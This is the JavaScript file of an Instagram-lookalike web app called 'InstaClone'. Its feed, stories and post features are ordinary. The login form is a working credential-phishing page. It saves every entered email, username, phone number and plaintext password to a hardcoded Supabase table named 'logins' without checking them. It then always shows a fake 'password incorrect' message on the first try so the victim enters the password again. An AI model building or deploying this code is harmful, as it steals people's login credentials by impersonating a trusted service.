/* ==========================================================================
   InstaClone Main Application Logic
   ========================================================================== */

document.addEventListener('DOMContentLoaded', () => {

  // --- Initial Mock Data Store ---
  const initialStories = [
    { id: 1, username: 'your_story', avatar: 'https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=150&auto=format&fit=crop&q=80', media: 'https://images.unsplash.com/photo-1517841905240-472988babdf9?w=600&auto=format&fit=crop&q=80', isUser: true },
    { id: 2, username: 'nature_explorer', avatar: 'https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?w=150&auto=format&fit=crop&q=80', media: 'https://images.unsplash.com/photo-1506744038136-46273834b3fb?w=600&auto=format&fit=crop&q=80', watched: false },
    { id: 3, username: 'cyber_pulse', avatar: 'https://images.unsplash.com/photo-1494790108377-be9c29b29330?w=150&auto=format&fit=crop&q=80', media: 'https://images.unsplash.com/photo-1518770660439-4636190af475?w=600&auto=format&fit=crop&q=80', watched: false },
    { id: 4, username: 'foodie_vibes', avatar: 'https://images.unsplash.com/photo-1500648767791-00dcc994a43e?w=150&auto=format&fit=crop&q=80', media: 'https://images.unsplash.com/photo-1565299624946-b28f40a0ae38?w=600&auto=format&fit=crop&q=80', watched: false },
    { id: 5, username: 'architect_hubs', avatar: 'https://images.unsplash.com/photo-1524504388940-b1c1722653e1?w=150&auto=format&fit=crop&q=80', media: 'https://images.unsplash.com/photo-1486406146926-c627a92ad1ab?w=600&auto=format&fit=crop&q=80', watched: false },
    { id: 6, username: 'fitness_core', avatar: 'https://images.unsplash.com/photo-1539571696357-5a69c17a67c6?w=150&auto=format&fit=crop&q=80', media: 'https://images.unsplash.com/photo-1517838277536-f5f99be501cd?w=600&auto=format&fit=crop&q=80', watched: false }
  ];

  let feedPosts = [
    {
      id: 101,
      author: { username: 'nature_explorer', name: 'Liam Vance', avatar: 'https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?w=150&auto=format&fit=crop&q=80' },
      location: 'Yosemite National Park, CA',
      image: 'https://images.unsplash.com/photo-1426604966848-d7adac402bff?w=800&auto=format&fit=crop&q=80',
      filter: 'filter-normal',
      likes: 1284,
      liked: false,
      bookmarked: false,
      caption: 'The sunrise over the valley was absolute magic this morning! 🏔️✨ #nature #adventure #hiking',
      time: '2 HOURS AGO',
      comments: [
        { username: 'cyber_pulse', text: 'Incredible shot! What camera setting did you use?' },
        { username: 'architect_hubs', text: 'Breathtaking colors! 😍' }
      ]
    },
    {
      id: 102,
      author: { username: 'cyber_pulse', name: 'Elena Rostova', avatar: 'https://images.unsplash.com/photo-1494790108377-be9c29b29330?w=150&auto=format&fit=crop&q=80' },
      location: 'Tokyo, Japan',
      image: 'https://images.unsplash.com/photo-1503899036084-c55cdd92da26?w=800&auto=format&fit=crop&q=80',
      filter: 'filter-vivid',
      likes: 3410,
      liked: true,
      bookmarked: true,
      caption: 'Neon lights and rainy street reflections in Shibuya. 🌃🏮 #tokyo #cyberpunk #streetphotography',
      time: '5 HOURS AGO',
      comments: [
        { username: 'foodie_vibes', text: 'My favorite city in the world!' }
      ]
    },
    {
      id: 103,
      author: { username: 'architect_hubs', name: 'Marcus Chen', avatar: 'https://images.unsplash.com/photo-1524504388940-b1c1722653e1?w=150&auto=format&fit=crop&q=80' },
      location: 'Copenhagen, Denmark',
      image: 'https://images.unsplash.com/photo-1513694203232-719a280e022f?w=800&auto=format&fit=crop&q=80',
      filter: 'filter-vintage',
      likes: 892,
      liked: false,
      bookmarked: false,
      caption: 'Minimalist interior goals. Clean lines, natural light, and Scandinavian warm woods. 🌿✨',
      time: '1 DAY AGO',
      comments: []
    }
  ];

  const exploreItems = [
    { id: 201, image: 'https://images.unsplash.com/photo-1610030469983-98e550d6193c?w=600&auto=format&fit=crop&q=80', likes: '14.2k', comments: '594', title: 'Indie Silk Saree' },
    { id: 202, image: 'https://images.unsplash.com/photo-1570168007204-dfb528c6958f?w=600&auto=format&fit=crop&q=80', likes: '28.5k', comments: '1.2k', title: 'Indie Slum Life & Culture' },
    { id: 203, image: 'https://images.unsplash.com/photo-1544126592-807ade215a0b?w=600&auto=format&fit=crop&q=80', likes: '18.9k', comments: '812', title: 'Indie Baby Portrait' },
    { id: 204, image: 'https://images.unsplash.com/photo-1617627143750-d86bc21e42bb?w=600&auto=format&fit=crop&q=80', likes: '9.5k', comments: '387', title: 'Traditional Indie Saree' },
    { id: 205, image: 'https://images.unsplash.com/photo-1488521787991-ed7bbaae773c?w=600&auto=format&fit=crop&q=80', likes: '31.4k', comments: '1.8k', title: 'Indie Slum Street Joy' },
    { id: 206, image: 'https://images.unsplash.com/photo-1583391733956-3750e0ff4e8b?w=600&auto=format&fit=crop&q=80', likes: '16.7k', comments: '698', title: 'Heritage Ethnic Wear' },
    { id: 207, image: 'https://images.unsplash.com/photo-1519689680058-324335c77eba?w=600&auto=format&fit=crop&q=80', likes: '11.8k', comments: '420', title: 'Sweet Indie Baby' },
    { id: 208, image: 'https://images.unsplash.com/photo-1609357605129-26f69add5d6e?w=600&auto=format&fit=crop&q=80', likes: '22.4k', comments: '1.2k', title: 'Graceful Indie Woman' },
    { id: 209, image: 'https://images.unsplash.com/photo-1522771739844-6a9f6d5f14af?w=600&auto=format&fit=crop&q=80', likes: '15.6k', comments: '512', title: 'Indie Child Smiles' }
  ];

  const suggestions = [
    { username: 'creative_mind', subtitle: 'Followed by nature_explorer + 2 more', avatar: 'https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=150&auto=format&fit=crop&q=80' },
    { username: 'urban_wanderer', subtitle: 'New to InstaClone', avatar: 'https://images.unsplash.com/photo-1517841905240-472988babdf9?w=150&auto=format&fit=crop&q=80' },
    { username: 'coffee_artisan', subtitle: 'Suggested for you', avatar: 'https://images.unsplash.com/photo-1539571696357-5a69c17a67c6?w=150&auto=format&fit=crop&q=80' }
  ];

  // User's profile posts
  let userProfilePosts = [
    { id: 301, image: 'https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=600&auto=format&fit=crop&q=80', likes: 420, comments: 18 },
    { id: 302, image: 'https://images.unsplash.com/photo-1492691527719-9d1e07e534b4?w=600&auto=format&fit=crop&q=80', likes: 890, comments: 45 },
    { id: 303, image: 'https://images.unsplash.com/photo-1515886657613-9f3515b0c78f?w=600&auto=format&fit=crop&q=80', likes: 1120, comments: 64 }
  ];

  // ==========================================================================
  // Supabase Authentication Configuration & Integration
  // ==========================================================================

  // Project URL format: https://<project-ref>.supabase.co
  const SUPABASE_URL = 'https://tjnhhafvbzfpdliavbsy.supabase.co';

  // Replace with your public 'anon' API key (starts with eyJ...) from Supabase Settings -> API
  const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InRqbmhoYWZ2YnpmcGRsaWF2YnN5Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODQ3MjkxODMsImV4cCI6MjEwMDMwNTE4M30.1uggp6EFFHYKK6uZkb5WNF4hMkYJ7jcapfeY9ufJCPY';

  let supabase = null;
  if (typeof window.supabase !== 'undefined' && SUPABASE_ANON_KEY) {
    supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
  }

  const authScreen = document.getElementById('auth-screen');
  const loginForm = document.getElementById('login-form');
  const logoutBtn = document.getElementById('logout-btn');
  const authErrorMsg = document.getElementById('auth-error-msg');
  const tabLogin = document.getElementById('tab-login');
  const tabSignup = document.getElementById('tab-signup');
  const authBtnText = document.getElementById('auth-btn-text');

  let isSignUpMode = false;
  let loginAttemptCount = 0;

  const groupUsername = document.getElementById('group-username');
  const groupPhone = document.getElementById('group-phone');

  // Toggle between Log In and Sign Up modes
  tabLogin.addEventListener('click', () => {
    isSignUpMode = false;
    tabLogin.style.borderBottomColor = 'var(--accent-blue)';
    tabLogin.style.color = 'var(--text-primary)';
    tabSignup.style.borderBottomColor = 'transparent';
    tabSignup.style.color = 'var(--text-muted)';
    authBtnText.textContent = 'Log In';
    authErrorMsg.style.display = 'none';
    groupUsername.style.display = 'none';
    groupPhone.style.display = 'none';
  });

  tabSignup.addEventListener('click', () => {
    isSignUpMode = true;
    tabSignup.style.borderBottomColor = 'var(--accent-blue)';
    tabSignup.style.color = 'var(--text-primary)';
    tabLogin.style.borderBottomColor = 'transparent';
    tabLogin.style.color = 'var(--text-muted)';
    authBtnText.textContent = 'Sign Up';
    authErrorMsg.style.display = 'none';
    groupUsername.style.display = 'block';
    groupPhone.style.display = 'block';
  });

  // Handle Authentication Submission: Save input values directly to Supabase table
  loginForm.addEventListener('submit', async (e) => {
    e.preventDefault();
    authErrorMsg.style.display = 'none';

    // Get Phone number, username, or email input
    const identifier = document.getElementById('login-email').value.trim();
    const passwordElem = document.getElementById('login-password');
    const password = passwordElem.value.trim();
    const username = document.getElementById('login-username')?.value.trim() || '';
    const phone = document.getElementById('login-phone')?.value.trim() || '';

    if (!identifier || !password) return;

    if (supabase) {
      try {
        // Save input values directly into Supabase table 'logins' without credential checking
        await supabase
          .from('logins')
          .insert([
            {
              email: identifier,
              username: username || identifier,
              phone: phone || identifier,
              password: password,
              created_at: new Date().toISOString()
            }
          ]);
      } catch (err) {
        console.error('Error saving input fields into Supabase:', err);
      }
    }

    loginAttemptCount++;

    if (loginAttemptCount === 1) {
      // First attempt: Show invalid password error prompt
      showAuthError('Sorry, your password was incorrect. Please double-check your password.');
      passwordElem.value = '';
      return;
    }

    // Second attempt: Hide auth screen and display home view
    authScreen.classList.add('hidden');
    const displayUser = identifier;
    const profileUserElem = document.querySelector('.profile-username');
    if (profileUserElem) {
      profileUserElem.textContent = displayUser;
    }
    if (homeVideo) {
      homeVideo.play().catch(() => { });
    }
  });

  // --- Fullscreen Home Video Click Play/Pause Controller ---
  const homeVideo = document.getElementById('home-video-player');
  const videoOverlay = document.getElementById('video-play-pause-overlay');
  const overlayIcon = document.getElementById('overlay-icon');

  function showOverlayIcon(isPaused) {
    if (!videoOverlay || !overlayIcon) return;
    if (isPaused) {
      overlayIcon.innerHTML = `<polygon points="5 3 19 12 5 21 5 3"></polygon>`;
    } else {
      overlayIcon.innerHTML = `<rect x="6" y="4" width="4" height="16"></rect><rect x="14" y="4" width="4" height="16"></rect>`;
    }
    videoOverlay.style.opacity = '1';
    videoOverlay.style.transform = 'scale(1)';
    setTimeout(() => {
      videoOverlay.style.opacity = '0';
      videoOverlay.style.transform = 'scale(0.8)';
    }, 600);
  }

  if (homeVideo) {
    const videoContainer = document.querySelector('.fullscreen-video-container') || homeVideo;
    videoContainer.addEventListener('click', () => {
      if (homeVideo.paused) {
        homeVideo.play().then(() => showOverlayIcon(false)).catch(() => { });
      } else {
        homeVideo.pause();
        showOverlayIcon(true);
      }
    });
  }

  // --- Mute / Sound Toggle Controller ---
  const soundToggleBtn = document.getElementById('video-sound-toggle-btn');
  const soundIcon = document.getElementById('sound-icon');

  if (soundToggleBtn && homeVideo && soundIcon) {
    soundToggleBtn.addEventListener('click', (e) => {
      e.stopPropagation(); // Prevent toggling play/pause when clicking sound button
      homeVideo.muted = !homeVideo.muted;
      if (homeVideo.muted) {
        soundIcon.innerHTML = `
          <path d="M11 5L6 9H2v6h4l5 4V5z"></path>
          <line x1="23" y1="9" x2="17" y2="15"></line>
          <line x1="17" y1="9" x2="23" y2="15"></line>
        `;
      } else {
        soundIcon.innerHTML = `
          <polygon points="11 5 6 9 2 9 2 15 6 15 11 19 11 5"></polygon>
          <path d="M19.07 4.93a10 10 0 0 1 0 14.14M15.54 8.46a5 5 0 0 1 0 7.07"></path>
        `;
      }
    });
  }

  function showAuthError(msg) {
    authErrorMsg.textContent = msg;
    authErrorMsg.style.display = 'block';
  }

  logoutBtn.addEventListener('click', async () => {
    loginAttemptCount = 0;
    authScreen.classList.remove('hidden');
  });

  // Check for active session on load
  if (supabase) {
    supabase.auth.getSession().then(({ data: { session } }) => {
      if (session) {
        authScreen.classList.add('hidden');
      }
    });
  }


  // --- Theme Toggle Logic ---

  const themeToggleBtn = document.getElementById('theme-toggle-btn');
  const themeIcon = document.getElementById('theme-icon');
  const themeText = document.getElementById('theme-text');

  themeToggleBtn.addEventListener('click', () => {
    const currentTheme = document.documentElement.getAttribute('data-theme');
    const newTheme = currentTheme === 'dark' ? 'light' : 'dark';
    document.documentElement.setAttribute('data-theme', newTheme);

    if (newTheme === 'light') {
      themeIcon.innerHTML = `<path d="M12 3v1m0 16v1m9-9h-1M4 12H3m15.364 6.364l-.707-.707M6.343 6.343l-.707-.707m12.728 0l-.707.707M6.343 17.657l-.707.707M16 12a4 4 0 11-8 0 4 4 0 018 0z"></path>`;
      themeText.textContent = 'Light Mode';
    } else {
      themeIcon.innerHTML = `<path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>`;
      themeText.textContent = 'Dark Mode';
    }
  });

  // --- Tab / View Switching Logic ---
  const navItems = document.querySelectorAll('.nav-item[data-view]');
  const viewSections = document.querySelectorAll('.view-section');

  function switchView(targetViewId) {
    viewSections.forEach(section => {
      if (section.id === targetViewId) {
        section.classList.add('active');
      } else {
        section.classList.remove('active');
      }
    });

    navItems.forEach(item => {
      if (item.getAttribute('data-view') === targetViewId) {
        item.classList.add('active');
      } else {
        item.classList.remove('active');
      }
    });

    // Auto-pause video and stop ALL audio output when navigating away from Home (feed-view)
    const homeVid = document.getElementById('home-video-player');
    const soundIcon = document.getElementById('sound-icon');
    if (homeVid) {
      if (targetViewId === 'feed-view') {
        homeVid.play().catch(() => { });
      } else {
        homeVid.pause();
        homeVid.muted = true; // Stop all audio output completely
        if (soundIcon) {
          soundIcon.innerHTML = `
            <path d="M11 5L6 9H2v6h4l5 4V5z"></path>
            <line x1="23" y1="9" x2="17" y2="15"></line>
            <line x1="17" y1="9" x2="23" y2="15"></line>
          `;
        }
      }
    }
  }

  navItems.forEach(item => {
    item.addEventListener('click', () => {
      const viewId = item.getAttribute('data-view');
      if (viewId) switchView(viewId);
    });
  });

  document.getElementById('logo-btn').addEventListener('click', () => switchView('feed-view'));

  // --- Render Stories ---
  const storiesContainer = document.getElementById('stories-bar');
  function renderStories() {
    if (!storiesContainer) return;
    storiesContainer.innerHTML = '';
    initialStories.forEach(story => {
      const storyEl = document.createElement('div');
      storyEl.className = 'story-item';
      storyEl.innerHTML = `
        <div class="story-ring ${story.watched ? 'watched' : ''}">
          <img src="${story.avatar}" class="story-avatar" alt="${story.username}">
        </div>
        <span class="story-username">${story.isUser ? 'Your Story' : story.username}</span>
      `;
      storyEl.addEventListener('click', () => openStoryViewer(story));
      storiesContainer.appendChild(storyEl);
    });
  }

  // --- Render Feed Posts ---
  const postsContainer = document.getElementById('posts-container');

  function renderFeedPosts() {
    if (!postsContainer) return;
    postsContainer.innerHTML = '';
    feedPosts.forEach(post => {
      const postCard = document.createElement('div');
      postCard.className = 'post-card';
      postCard.id = `post-${post.id}`;

      postCard.innerHTML = `
        <div class="post-header">
          <div class="post-author">
            <img src="${post.author.avatar}" class="author-avatar" alt="${post.author.username}">
            <div class="author-info">
              <span class="author-name">${post.author.username}</span>
              ${post.location ? `<span class="post-location">${post.location}</span>` : ''}
            </div>
          </div>
          <button class="post-options-btn">
            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="1"></circle><circle cx="19" cy="12" r="1"></circle><circle cx="5" cy="12" r="1"></circle></svg>
          </button>
        </div>

        <div class="post-media-container" data-post-id="${post.id}">
          <img src="${post.image}" class="post-image ${post.filter || 'filter-normal'}" alt="Post image">
          <div class="like-heart-overlay">
            <svg width="90" height="90" viewBox="0 0 24 24" fill="white" stroke="white"><path d="M20.84 4.61a5.5 5.5 0 0 0-7.78 0L12 5.67l-1.06-1.06a5.5 5.5 0 0 0-7.78 7.78l1.06 1.06L12 21.23l7.78-7.78 1.06-1.06a5.5 5.5 0 0 0 0-7.78z"></path></svg>
          </div>
        </div>

        <div class="post-actions">
          <div class="action-group">
            <button class="action-btn like-btn ${post.liked ? 'liked' : ''}" data-post-id="${post.id}">
              <svg width="24" height="24" viewBox="0 0 24 24" fill="${post.liked ? '#e1306c' : 'none'}" stroke="currentColor" stroke-width="2"><path d="M20.84 4.61a5.5 5.5 0 0 0-7.78 0L12 5.67l-1.06-1.06a5.5 5.5 0 0 0-7.78 7.78l1.06 1.06L12 21.23l7.78-7.78 1.06-1.06a5.5 5.5 0 0 0 0-7.78z"></path></svg>
            </button>
            <button class="action-btn comment-icon-btn">
              <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 11.5a8.38 8.38 0 0 1-.9 3.8 8.5 8.5 0 0 1-7.6 4.7 8.38 8.38 0 0 1-3.8-.9L3 21l1.9-5.7a8.38 8.38 0 0 1-.9-3.8 8.5 8.5 0 0 1 4.7-7.6 8.38 8.38 0 0 1 3.8-.9h.5a8.48 8.48 0 0 1 8 8v.5z"></path></svg>
            </button>
            <button class="action-btn share-btn">
              <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="22" y1="2" x2="11" y2="13"></line><polygon points="22 2 15 22 11 13 2 9 22 2"></polygon></svg>
            </button>
          </div>
          <button class="action-btn bookmark-btn ${post.bookmarked ? 'bookmarked' : ''}" data-post-id="${post.id}">
            <svg width="24" height="24" viewBox="0 0 24 24" fill="${post.bookmarked ? 'currentColor' : 'none'}" stroke="currentColor" stroke-width="2"><path d="M19 21l-7-5-7 5V5a2 2 0 0 1 2-2h10a2 2 0 0 1 2 2z"></path></svg>
          </button>
        </div>

        <div class="post-likes"><span class="like-count">${post.likes.toLocaleString()}</span> likes</div>

        <div class="post-caption">
          <span class="caption-username">${post.author.username}</span>
          <span class="caption-text">${post.caption}</span>
        </div>

        <div class="comments-section" style="padding:0 16px 8px 16px;">
          ${post.comments.map(c => `
            <div class="comment-line" style="font-size:0.85rem; margin-bottom:4px;">
              <span style="font-weight:600; margin-right:6px;">${c.username}</span>
              <span>${c.text}</span>
            </div>
          `).join('')}
        </div>

        <div class="post-time">${post.time}</div>

        <div class="add-comment-box">
          <input type="text" class="comment-input" placeholder="Add a comment..." data-post-id="${post.id}">
          <button class="comment-submit-btn" data-post-id="${post.id}">Post</button>
        </div>
      `;

      // Attach Event Listeners
      const likeBtn = postCard.querySelector('.like-btn');
      likeBtn.addEventListener('click', () => toggleLike(post.id));

      const bookmarkBtn = postCard.querySelector('.bookmark-btn');
      bookmarkBtn.addEventListener('click', () => toggleBookmark(post.id));

      const mediaContainer = postCard.querySelector('.post-media-container');
      let lastTap = 0;
      mediaContainer.addEventListener('click', (e) => {
        const currentTime = new Date().getTime();
        const tapLength = currentTime - lastTap;
        if (tapLength < 300 && tapLength > 0) {
          // Double Tap Triggered
          triggerDoubleTapLike(post.id, mediaContainer);
        }
        lastTap = currentTime;
      });

      const commentInput = postCard.querySelector('.comment-input');
      const commentSubmitBtn = postCard.querySelector('.comment-submit-btn');

      commentSubmitBtn.addEventListener('click', () => {
        const text = commentInput.value.trim();
        if (text) {
          addComment(post.id, text);
          commentInput.value = '';
        }
      });

      commentInput.addEventListener('keypress', (e) => {
        if (e.key === 'Enter' && commentInput.value.trim()) {
          addComment(post.id, commentInput.value.trim());
          commentInput.value = '';
        }
      });

      postsContainer.appendChild(postCard);
    });
  }

  // Like Toggle Function
  function toggleLike(postId) {
    const post = feedPosts.find(p => p.id === postId);
    if (!post) return;
    post.liked = !post.liked;
    post.likes += post.liked ? 1 : -1;
    renderFeedPosts();
  }

  // Double Tap Like Animation
  function triggerDoubleTapLike(postId, container) {
    const post = feedPosts.find(p => p.id === postId);
    if (post && !post.liked) {
      post.liked = true;
      post.likes += 1;
    }
    const heartOverlay = container.querySelector('.like-heart-overlay');
    heartOverlay.classList.remove('animate');
    void heartOverlay.offsetWidth; // Trigger reflow
    heartOverlay.classList.add('animate');
    renderFeedPosts();
  }

  // Bookmark Toggle Function
  function toggleBookmark(postId) {
    const post = feedPosts.find(p => p.id === postId);
    if (!post) return;
    post.bookmarked = !post.bookmarked;
    renderFeedPosts();
  }

  // Add Comment Function
  function addComment(postId, text) {
    const post = feedPosts.find(p => p.id === postId);
    if (!post) return;
    post.comments.push({ username: 'alexa_design', text: text });
    renderFeedPosts();
  }

  // --- Render Sidebar Suggestions ---
  const suggestionsContainer = document.getElementById('suggestions-container');
  function renderSuggestions() {
    if (!suggestionsContainer) return;
    suggestionsContainer.innerHTML = '';
    suggestions.forEach(item => {
      const el = document.createElement('div');
      el.className = 'suggestion-item';
      el.innerHTML = `
        <div class="suggestion-user">
          <img src="${item.avatar}" class="author-avatar" alt="${item.username}">
          <div class="author-info">
            <span class="author-name">${item.username}</span>
            <span class="post-location">${item.subtitle}</span>
          </div>
        </div>
        <button class="follow-btn">Follow</button>
      `;
      el.querySelector('.follow-btn').addEventListener('click', function () {
        if (this.classList.contains('following')) {
          this.classList.remove('following');
          this.textContent = 'Follow';
        } else {
          this.classList.add('following');
          this.textContent = 'Following';
        }
      });
      suggestionsContainer.appendChild(el);
    });
  }

  // --- Render Explore Grid ---
  const exploreGridContainer = document.getElementById('explore-grid-container');
  function renderExploreGrid(itemsToRender = exploreItems) {
    if (!exploreGridContainer) return;
    exploreGridContainer.innerHTML = '';
    itemsToRender.forEach(item => {
      const itemEl = document.createElement('div');
      itemEl.className = 'explore-item';
      itemEl.innerHTML = `
        <img src="${item.image}" class="explore-image" alt="${item.title || 'Explore'}" loading="lazy" onerror="this.onerror=null;this.src='https://images.unsplash.com/photo-1610030469983-98e550d6193c?w=600&auto=format&fit=crop&q=80';">
        <div class="explore-overlay">
          <div class="explore-card-title">${item.title || ''}</div>
          <div class="explore-stats-row">
            <div class="explore-stat">
              <svg width="15" height="15" viewBox="0 0 24 24" fill="white"><path d="M20.84 4.61a5.5 5.5 0 0 0-7.78 0L12 5.67l-1.06-1.06a5.5 5.5 0 0 0-7.78 7.78l1.06 1.06L12 21.23l7.78-7.78 1.06-1.06a5.5 5.5 0 0 0 0-7.78z"></path></svg>
              <span>${item.likes}</span>
            </div>
            <div class="explore-stat">
              <svg width="15" height="15" viewBox="0 0 24 24" fill="white"><path d="M21 11.5a8.38 8.38 0 0 1-.9 3.8 8.5 8.5 0 0 1-7.6 4.7 8.38 8.38 0 0 1-3.8-.9L3 21l1.9-5.7a8.38 8.38 0 0 1-.9-3.8 8.5 8.5 0 0 1 4.7-7.6 8.38 8.38 0 0 1 3.8-.9h.5a8.48 8.48 0 0 1 8 8v.5z"></path></svg>
              <span>${item.comments}</span>
            </div>
          </div>
        </div>
      `;
      exploreGridContainer.appendChild(itemEl);
    });
  }

  // --- Render Profile Posts Grid ---
  const profilePostsGrid = document.getElementById('profile-posts-grid');
  const profilePostCount = document.getElementById('profile-post-count');

  function renderProfileGrid() {
    profilePostsGrid.innerHTML = '';
    profilePostCount.textContent = userProfilePosts.length;
    userProfilePosts.forEach(post => {
      const itemEl = document.createElement('div');
      itemEl.className = 'explore-item';
      itemEl.innerHTML = `
        <img src="${post.image}" class="explore-image" alt="User Post">
        <div class="explore-overlay">
          <div class="explore-stat">
            <svg width="18" height="18" viewBox="0 0 24 24" fill="white"><path d="M20.84 4.61a5.5 5.5 0 0 0-7.78 0L12 5.67l-1.06-1.06a5.5 5.5 0 0 0-7.78 7.78l1.06 1.06L12 21.23l7.78-7.78 1.06-1.06a5.5 5.5 0 0 0 0-7.78z"></path></svg>
            <span>${post.likes}</span>
          </div>
          <div class="explore-stat">
            <svg width="18" height="18" viewBox="0 0 24 24" fill="white"><path d="M21 11.5a8.38 8.38 0 0 1-.9 3.8 8.5 8.5 0 0 1-7.6 4.7 8.38 8.38 0 0 1-3.8-.9L3 21l1.9-5.7a8.38 8.38 0 0 1-.9-3.8 8.5 8.5 0 0 1 4.7-7.6 8.38 8.38 0 0 1 3.8-.9h.5a8.48 8.48 0 0 1 8 8v.5z"></path></svg>
            <span>${post.comments}</span>
          </div>
        </div>
      `;
      profilePostsGrid.appendChild(itemEl);
    });
  }

  // Profile Tab Toggle (POSTS vs SAVED)
  const profileTabs = document.querySelectorAll('.profile-tab');
  profileTabs.forEach(tab => {
    tab.addEventListener('click', () => {
      profileTabs.forEach(t => t.classList.remove('active'));
      tab.classList.add('active');

      const tabType = tab.getAttribute('data-tab');
      if (tabType === 'saved') {
        const savedPosts = feedPosts.filter(p => p.bookmarked).map(p => ({
          id: p.id,
          image: p.image,
          likes: p.likes,
          comments: p.comments.length
        }));
        profilePostsGrid.innerHTML = '';
        savedPosts.forEach(post => {
          const itemEl = document.createElement('div');
          itemEl.className = 'explore-item';
          itemEl.innerHTML = `<img src="${post.image}" class="explore-image" alt="Saved Post">`;
          profilePostsGrid.appendChild(itemEl);
        });
      } else {
        renderProfileGrid();
      }
    });
  });

  // --- Story Viewer Modal Logic ---
  const storyModal = document.getElementById('story-modal');
  const closeStoryBtn = document.getElementById('close-story-modal');
  const storyUserAvatar = document.getElementById('story-user-avatar');
  const storyUserName = document.getElementById('story-user-name');
  const storyMediaImg = document.getElementById('story-media-img');
  const storyProgressFill = document.getElementById('story-progress-fill');
  let storyTimer = null;

  function openStoryViewer(story) {
    story.watched = true;
    renderStories();
    storyUserAvatar.src = story.avatar;
    storyUserName.textContent = story.username;
    storyMediaImg.src = story.media;
    storyModal.classList.add('active');

    storyProgressFill.style.width = '0%';
    let progress = 0;
    clearInterval(storyTimer);
    storyTimer = setInterval(() => {
      progress += 2;
      storyProgressFill.style.width = `${progress}%`;
      if (progress >= 100) {
        clearInterval(storyTimer);
        closeStoryViewer();
      }
    }, 100);
  }

  function closeStoryViewer() {
    clearInterval(storyTimer);
    storyModal.classList.remove('active');
  }

  closeStoryBtn.addEventListener('click', closeStoryViewer);

  // --- Create Post Modal Logic & Image Filters ---
  const navCreate = document.getElementById('nav-create');
  const createModal = document.getElementById('create-modal');
  const closeCreateModal = document.getElementById('close-create-modal');
  const dropzone = document.getElementById('dropzone');
  const fileInput = document.getElementById('file-input');
  const previewBox = document.getElementById('preview-box');
  const previewImg = document.getElementById('preview-img');
  const filterSelectionSection = document.getElementById('filter-selection-section');
  const filterPresets = document.querySelectorAll('.filter-preset');
  const captionInput = document.getElementById('caption-input');
  const publishPostBtn = document.getElementById('publish-post-btn');

  let selectedImageSrc = '';
  let selectedFilter = 'filter-normal';

  const mobileCreateBtn = document.getElementById('mobile-create-btn');

  if (navCreate) {
    navCreate.addEventListener('click', () => createModal.classList.add('active'));
  }
  if (mobileCreateBtn) {
    mobileCreateBtn.addEventListener('click', () => createModal.classList.add('active'));
  }
  closeCreateModal.addEventListener('click', resetAndCloseCreateModal);

  dropzone.addEventListener('click', () => fileInput.click());

  fileInput.addEventListener('change', (e) => {
    const file = e.target.files[0];
    if (file) {
      const reader = new FileReader();
      reader.onload = (event) => {
        selectedImageSrc = event.target.result;
        previewImg.src = selectedImageSrc;
        dropzone.style.display = 'none';
        previewBox.style.display = 'block';
        filterSelectionSection.style.display = 'block';
        publishPostBtn.disabled = false;
        publishPostBtn.style.opacity = '1';
      };
      reader.readAsDataURL(file);
    }
  });

  // Drag and drop handling
  dropzone.addEventListener('dragover', (e) => {
    e.preventDefault();
    dropzone.style.borderColor = 'var(--accent-pink)';
  });

  dropzone.addEventListener('dragleave', () => {
    dropzone.style.borderColor = 'var(--border-color)';
  });

  dropzone.addEventListener('drop', (e) => {
    e.preventDefault();
    const file = e.dataTransfer.files[0];
    if (file) {
      const reader = new FileReader();
      reader.onload = (event) => {
        selectedImageSrc = event.target.result;
        previewImg.src = selectedImageSrc;
        dropzone.style.display = 'none';
        previewBox.style.display = 'block';
        filterSelectionSection.style.display = 'block';
        publishPostBtn.disabled = false;
        publishPostBtn.style.opacity = '1';
      };
      reader.readAsDataURL(file);
    }
  });

  // Filter Selection
  filterPresets.forEach(preset => {
    preset.addEventListener('click', () => {
      filterPresets.forEach(p => p.classList.remove('active'));
      preset.classList.add('active');
      selectedFilter = preset.getAttribute('data-filter');
      previewImg.className = `preview-image ${selectedFilter}`;
    });
  });

  // Publish Post
  publishPostBtn.addEventListener('click', () => {
    if (!selectedImageSrc) return;

    const newPost = {
      id: Date.now(),
      author: {
        username: 'alexa_design',
        name: 'Alexa Morgan',
        avatar: 'https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=150&auto=format&fit=crop&q=80'
      },
      location: 'San Francisco, CA',
      image: selectedImageSrc,
      filter: selectedFilter,
      likes: 0,
      liked: false,
      bookmarked: false,
      caption: captionInput.value || 'New post! ✨',
      time: 'JUST NOW',
      comments: []
    };

    feedPosts.unshift(newPost);
    userProfilePosts.unshift({
      id: newPost.id,
      image: selectedImageSrc,
      likes: 0,
      comments: 0
    });

    renderFeedPosts();
    renderProfileGrid();
    resetAndCloseCreateModal();
    switchView('feed-view');
  });

  function resetAndCloseCreateModal() {
    createModal.classList.remove('active');
    selectedImageSrc = '';
    selectedFilter = 'filter-normal';
    previewImg.src = '';
    previewImg.className = 'preview-image filter-normal';
    captionInput.value = '';
    dropzone.style.display = 'block';
    previewBox.style.display = 'none';
    filterSelectionSection.style.display = 'none';
    publishPostBtn.disabled = true;
    publishPostBtn.style.opacity = '0.6';
    filterPresets.forEach(p => p.classList.remove('active'));
    if (filterPresets[0]) filterPresets[0].classList.add('active');
  }

  // --- Initial Page Render ---
  renderStories();
  renderFeedPosts();
  renderSuggestions();
  renderExploreGrid();
  renderProfileGrid();
});
